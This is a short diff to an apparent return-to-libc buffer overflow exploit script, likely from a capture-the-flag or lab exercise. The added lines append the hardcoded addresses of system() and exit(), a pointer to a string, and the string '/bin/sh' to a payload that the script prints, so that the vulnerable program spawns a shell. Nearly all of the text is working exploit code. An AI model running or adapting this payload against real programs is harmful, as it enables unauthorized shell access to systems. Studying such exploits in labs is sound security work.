@@ -11,9 +11,18 @@ exp += "UUUU"
 # Fill the Function args??? and the old base pointer
 exp += 12 * 'B'
 
+# 0xf7e3f950: system
+exp += "\x50\xf9\xe3\xf7"
+
+# 0xffffcfd8: Address of the string
+exp +="\xf0\xcf\xff\xff"
+
 # 0xf7e337c0: address of exit function
-# The exploit must be in litle endian, i.e. reverse the bytes 
 exp += "\xc0\x37\xe3\xf7"
+
+
+# String
+exp += "/bin/sh"
 
 print(exp)
 
